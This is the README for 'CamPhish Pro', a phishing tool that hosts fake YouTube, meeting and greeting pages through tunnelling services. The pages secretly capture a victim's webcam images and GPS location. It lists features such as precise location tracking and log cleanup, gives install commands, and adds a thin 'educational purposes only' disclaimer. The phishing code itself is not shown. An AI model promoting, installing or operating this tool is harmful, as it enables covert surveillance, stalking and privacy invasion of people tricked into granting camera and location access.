# CamPhish Pro 🚀

![CamPhish Banner](https://i.imgur.com/JKvQw9E.png)

**Developed by Rayhan**  
*The Ultimate Camera Phishing Tool for Ethical Security Testing*

## 🔍 What is CamPhish Pro?
CamPhish Pro is an advanced security testing tool that demonstrates how camera access can be exploited through social engineering. This tool is designed **for educational purposes only** to raise awareness about phishing risks.

## ✨ Key Features
- 🎭 **3 Professional Templates**
  - Live YouTube TV
  - Online Meeting
  - Festival Greetings
- 📍 **Precision Location Tracking**
  - GPS coordinates
  - Google Maps links
  - Accuracy metrics
- 🌐 **Multi-Tunnel Support**
  - Ngrok (Recommended)
  - Cloudflared
  - Localtunnel
- 📱 **Cross-Platform Compatibility**
  - Termux (Android)
  - Linux
  - macOS
  - Windows (WSL)

## 🛠️ Installation Guide

### Termux (Android)
```bash
pkg install -y git php wget
git clone https://github.com/your-username/CamPhish-Pro
cd CamPhish-Pro
chmod +x camphish-pro.sh
./camphish-pro.sh
```

### Linux/macOS
```bash
sudo apt-get install -y php wget unzip
git clone https://github.com/your-username/CamPhish-Pro
cd CamPhish-Pro
./camphish-pro.sh
```

## 📂 File Structure
```
CamPhish-Pro/
├── camphish-pro.sh         # Main script
├── templates/              # Phishing templates
├── core/                   # Core processing files
├── tools/                  # Tunnel utilities
└── logs/                   # Captured data (auto-cleaned)
```

## 🆕 Version History
### v5.0 (Current)
- ✅ Fully rebranded with Rayhan credits
- ✅ Enhanced Termux compatibility
- ✅ New GPS tracking algorithm
- ✅ Multi-tunnel failover system

### v4.2
- 🐛 Fixed Termux camera permission issues
- ✨ Added ARM64 support
- 🌐 Improved tunnel stability

## ⚠️ Legal Disclaimer
This tool is provided **for educational and ethical security testing purposes only**. Unauthorized use against any system without explicit permission is illegal. The developer assumes no liability for misuse.

## 📌 Pro Tips
1. Use Ngrok for HTTPS support
2. Grant Termux camera permissions
3. Clean logs regularly using:
```bash
./cleanup.sh
```

## 📬 Contact
For ethical security consulting:  
📧 Email: rayhankhan4u@gmail.com

---

*"Knowledge is power, but ethics is the switch that controls it."* - Rayhan
